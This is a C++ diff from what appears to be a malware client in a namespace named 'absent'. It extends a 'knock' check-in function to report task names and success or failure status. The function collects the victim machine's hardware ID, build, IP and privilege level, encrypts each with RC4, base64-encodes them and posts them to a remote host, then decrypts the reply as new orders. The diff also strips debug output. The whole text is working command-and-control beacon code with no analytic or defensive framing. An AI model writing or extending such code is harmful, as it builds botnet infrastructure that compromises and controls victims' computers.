@@ -24,26 +24,29 @@ namespace absent
 			toSend = "request=" + toSend;
 
 			std::string res = absent::http::post(host, path, toSend);
-			std::cout << res << std::endl;
 			return decryptResponce(res, key);
 		}
 
-		nlohmann::json knock(std::string host, std::string path, nlohmann::json info, std::string key)
+		nlohmann::json knock(std::string host, std::string path, nlohmann::json info, std::string key, std::string task, bool failed)
 		{
 			absent::crypto::RC4 rc4;
+			std::string status;
+			if (failed) { status = "Failed"; }
+			if (!failed) { status = "Success"; }
 			nlohmann::json smallInfo = 
 			{
 				{"check", absent::crypto::b64::encode(rc4.crypt("check", key).c_str())},
 				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
 				{"bu", absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str())},
 				{"ip", absent::crypto::b64::encode(rc4.crypt(info["ip"], key).c_str())},
-				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())}
+				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())},
+				{"ct", absent::crypto::b64::encode(rc4.crypt(task, key).c_str())},
+				{"st", absent::crypto::b64::encode(rc4.crypt(status, key).c_str())}
 			};
 			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
 			toSend = "request=" + toSend;
 			
 			std::string res = absent::http::post(host, path, toSend);
-			std::cout << res << std::endl;
 			return decryptResponce(res, key);
 		}
 	}
